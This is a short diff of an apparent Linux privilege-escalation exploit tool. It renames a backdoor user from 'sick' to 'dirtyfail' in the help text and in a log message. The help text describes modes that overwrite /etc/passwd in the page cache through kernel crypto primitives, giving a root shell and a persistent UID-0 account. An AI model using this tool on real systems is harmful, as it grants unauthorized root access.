@@ -65,9 +65,9 @@ static void usage(const char *prog)
 "  --exploit-gcm          real PoC: flip /etc/passwd UID via rfc4106(gcm(aes))\n"
 "                         single-byte primitive (works when authencesn is\n"
 "                         blacklisted but rfc4106 isn't)\n"
-"  --exploit-backdoor     PERSISTENT: insert sick:0:0:::/:/bin/bash into\n"
-"                         /etc/passwd page cache; survives shell exit until\n"
-"                         page eviction. Use --cleanup-backdoor to revert.\n"
+"  --exploit-backdoor     PERSISTENT: insert dirtyfail::0:0:..:/:/bin/bash\n"
+"                         into /etc/passwd page cache; survives shell exit\n"
+"                         until page eviction. Use --cleanup-backdoor to revert.\n"
 "  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
 "  --cleanup-backdoor     restore /etc/passwd line from /var/tmp/.dirtyfail.state\n"
 "  --version              print version\n"
@@ -275,7 +275,7 @@ int main(int argc, char **argv)
         break;
 
     case MODE_EXPLOIT_BACKDOOR:
-        log_warn("installing PERSISTENT backdoor user 'sick' (page-cache only)");
+        log_warn("installing PERSISTENT backdoor user 'dirtyfail' (page-cache only)");
         r = backdoor_install(do_shell);
         break;
 
